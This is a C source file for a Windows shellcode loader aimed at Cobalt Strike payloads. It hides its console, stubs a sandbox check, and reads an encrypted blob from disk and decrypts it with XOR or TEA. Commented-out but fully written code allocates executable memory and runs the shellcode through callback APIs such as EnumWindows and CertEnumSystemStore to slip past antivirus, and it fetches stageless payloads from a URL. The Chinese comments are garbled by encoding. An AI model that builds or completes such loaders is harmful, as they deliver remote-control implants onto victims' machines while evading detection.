#include<Windows.h>
//#include <stdio.h>
//#include <stdlib.h>
#include<stdbool.h>

#define htonl(x) ((x&0x000000ff) << 24 | (x&0x0000ff00) << 8 | (x&0x00ff0000) >> 8 | (x&0xff000000) >> 24)
#define HIDWORD(x)  (*((DWORD*)&(x)+1))

#pragma comment(linker,"/subsystem:\"windows\" /entry:\"mainCRTStartup\"")//����ʾ����

typedef void(*void_func_ptr)(void);


#define	MagicValue			WORD

struct ConfigurationData {
	unsigned char*		shellcode;
	DWORD				shellcodeSize;
	IMAGE_DOS_HEADER	mDosHeader;
	MagicValue			wMagic;
	IMAGE_NT_HEADERS32	mNtHeader;
};

/*****���ݰ���װ
* |STu8		|STu8*			|STu32			|STu8*		|
* |��������	|��Կ��16�ֽڣ�	|�������ݳ���	|��������	|
******/

//��������
#define H_ENC_XOR	(unsigned char)(0xB1)
#define H_ENC_AES	(unsigned char)(0xB2)
#define H_ENC_RC4	(unsigned char)(0xB3)
#define H_ENC_TEA	(unsigned char)(0xB4)

/*****�������ݷ�װ
* |STu8		|STu32			|STu8*		|
* |��������	|���ݳ���		|payload����|
******/

//payload��������
#define P_TYPE_STAGE		(unsigned char)(0xA0)
#define P_TYPE_STAGELESSURL	(unsigned char)(0xA1)

/*****stage payload
* Conbalt strike����ľ��ʽ���ɵĽ׶�һľ��
******/

/*****stageless url
* Conbalt strike����ľ��ʽ���ɵĽ׶ζ�ľ��url
* ���ݽ׶�һľ���������
******/

//���ɳ��
bool ForSD()
{
	return false;
}

/*
* tea����
* 360ֱ�ӱ���
*/
void decrypt_tea(unsigned long* in, unsigned long* key, unsigned long* out)
{

	unsigned long code[4];
	register unsigned long n = 0x10, sum, y, z, delta = 0xab451fc4;

	sum = delta * n;
	y = htonl(in[0]);
	z = htonl(in[1]);

	code[0] = htonl(key[0]); code[1] = htonl(key[1]);
	code[2] = htonl(key[2]); code[3] = htonl(key[3]);

	while (n-- > 0)
	{
		z -= ((y >> 5) + code[3]) ^ ((y << 4) + code[2]) ^ (sum + y);
		y -= ((z >> 5) + code[1]) ^ ((z << 4) + code[0]) ^ (sum + z);
		sum -= delta;
	}
	out[0] = htonl(y);
	out[1] = htonl(z);
}

/*
* tea����
* 360ֱ�ӱ���
*/
void tea_decrypt(unsigned char* in, unsigned int inlen, unsigned char* key, unsigned char** out, unsigned int* outlen)
{
	unsigned char q[8], mkey[8], * q1, * q2, * outp;
	register int count, i, j, p;

	if (inlen % 8 || inlen < 16) return;
	/* get basic information of the packet */
	decrypt_tea((unsigned long*)in, (unsigned long*)key, (unsigned long*)q);
	j = q[0] & 0x7;
	count = inlen - j - 10;
	*outlen = count;
	*out = (unsigned char*)malloc(*outlen);
	if (*out == NULL) return;
	memset(*out, 0, *outlen);


	if (count < 0) return;

	memset(mkey, 0, 8);
	q2 = mkey;
	i = 8; p = 1;
	q1 = in + 8;
	j++;
	while (p <= 2)
	{
		if (j < 8)
		{
			j++;
			p++;
		}
		else if (j == 8)
		{
			q2 = in;
			for (j = 0; j < 8; j++)
			{
				if (i + j >= inlen) return;
				q[j] ^= q1[j];
			}
			decrypt_tea((unsigned long*)q, (unsigned long*)key,
				(unsigned long*)q);
			i += 8;
			q1 += 8;
			j = 0;
		}
	}
	outp = *out;
	while (count != 0)
	{
		if (j < 8)
		{
			outp[0] = q2[j] ^ q[j];
			outp++;
			count--;
			j++;
		}
		else if (j == 8)
		{
			q2 = q1 - 8;
			for (j = 0; j < 8; j++)
			{
				if (i + j >= inlen)
					return;
				q[j] ^= q1[j];
			}
			decrypt_tea((unsigned long*)q, (unsigned long*)key,
				(unsigned long*)q);
			i += 8;
			q1 += 8;
			j = 0;
		}
	}
	for (p = 1; p < 8; p++)
	{
		if (j < 8)
		{
			if (q2[j] ^ q[j])
				return;
			j++;
		}
		else if (j == 8)
		{
			q2 = q1;
			for (j = 0; j < 8; j++)
			{
				if (i + j >= inlen)
					return;
				q[j] ^= q1[j];
			}
			decrypt_tea((unsigned long*)q, (unsigned long*)key,
				(unsigned long*)q);
			i += 8;
			q1 += 8;
			j = 0;
		}
	}
}

/*
* �Ӽ������ݽ���shellcode
* tea���ܻᱨ�����п����ǹ̶���Կ������
*/
int DecryptSC(struct ConfigurationData* config,unsigned char *encData,unsigned int encDataSize)
{
	//unsigned int dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	//if (!dwBaseAddr) return -1;

	if (encData[0] == H_ENC_XOR)
	{
		int encdatasize = *(unsigned int*)(encData + 1 + 16);
		for (int i = 0; i < encdatasize; i++)
		{
			(encData + 1 + 16 + 4)[i] ^= (encData + 1)[i % 0x10];
		}
	}
	else if (encData[0] == H_ENC_AES)
	{

	}
	else if (encData[0] == H_ENC_RC4)
	{

	}
	else if (encData[0] == H_ENC_TEA)
	{
		//int encdatasize = *(unsigned int*)(encData + 1 + 16);
		////TEA����
		//tea_decrypt((encData + 1 + 16 + 4), encdatasize, (encData + 1) , &config->shellcode, (unsigned int*)&config->shellcodeSize);
		//if (config->shellcode == NULL) {
		//	return -1;
		//}
	}
	else
		return -1;

	return 0;
}

/*
* ���ļ���ȡshellcode
*/
int GetSCPointerFromFile(const char *file,struct ConfigurationData* config,unsigned int **scPointer,unsigned int *scSize)
{
	HANDLE h=CreateFile(file, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
	if (h == INVALID_HANDLE_VALUE) return -1;
	*scSize = GetFileSize(h, NULL);
	*scPointer = (char*)malloc(*scSize);
	if (*scPointer)
	{
		DWORD RSize;
		if (!ReadFile(h, *scPointer, *scSize, &RSize, NULL)) return -1;
		if (RSize != *scSize)
		{
			return -1;
		}
		return 0;
	}
	return -1;
}

/*
* ��������shellcode
*/
int RunSCFromFile(const char *file,struct ConfigurationData* config)
{
	unsigned char* encData = 0;
	unsigned int encDataSize = 0;
	//����PE�ṹ�������λ�ȡSC
	if (GetSCPointerFromFile(file ,config, &encData, &encDataSize) == 0)
	{
		//����SC
		//if (DecryptSC(config, encData, &encDataSize) == 0)
		//{
		//	free(encData);
		//	encData = 0;
		//	if (config->shellcode[0] == P_TYPE_STAGE)
		//	{
		//		//������ת����
		//		int amtWritten = (1 + sizeof(DWORD));
		//		DWORD jumpOffset = 5;
		//		jumpOffset -= amtWritten;
		//		{
		//			//��ֵ0xe9
		//			//*encData = 0xA1;
		//			//*encData ^= 0x48;
		//		}

		//		//DWORD* jumpTarget = (DWORD*)(encData + sizeof(jmp32bitOffset));
		//		//*jumpTarget = jumpOffset;

		//		////ִ��shellcode����
		//		//void_func_ptr callLoc = (void_func_ptr)(encData);
		//		//callLoc();//�������ñ���
		//		//EnumWindows((WNDENUMPROC)(callLoc), 0); //�������ñ���
		//		//EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)callLoc, LGRPID_INSTALLED, NULL);//�������ñ���
		//		//CertEnumSystemStore(0x10000, 0, "system", (PFN_CERT_ENUM_SYSTEM_STORE)callLoc);//�������ñ���
		//	}
		//	else if (config->shellcode[0] == P_TYPE_STAGELESSURL)
		//	{
		//		//unsigned int urllen = *(unsigned int*)(config->shellcode + 1);
		//		//unsigned char* url = malloc(urllen + 1);
		//		//if (url)
		//		//{
		//		//	//����url
		//		//	memset(url, 0, urllen + 1);
		//		//	memcpy(url, config->shellcode + 1 + 4, urllen);
		//		//	GetStageless(url, &config->shellcode, &config->shellcodeSize);
		//		//	free(url);
		//		//	unsigned int dwBaseAddr = VirtualAlloc(0, config->shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
		//		//	if (dwBaseAddr)
		//		//	{
		//		//		memcpy(dwBaseAddr, config->shellcode, config->shellcodeSize);
		//		//		free(config->shellcode);
		//		//		DWORD oldpro = PAGE_READWRITE;
		//		//		if (VirtualProtect(dwBaseAddr, config->shellcodeSize, PAGE_EXECUTE_READWRITE, &oldpro))
		//		//			((void(*)())dwBaseAddr)();
		//		//	}
		//		//}
		//		//else
		//		//	return -1;
		//	}
		//	return 0;
		//}
	}
	return -1;
}

int main(int argc, char* argv[])
{
	if (argc < 2) return -1;
	if (ForSD())
	{
		return -1;
	}
	struct ConfigurationData config;
	memset(&config, 0, sizeof(struct ConfigurationData));
	RunSCFromFile(argv[1],&config);
}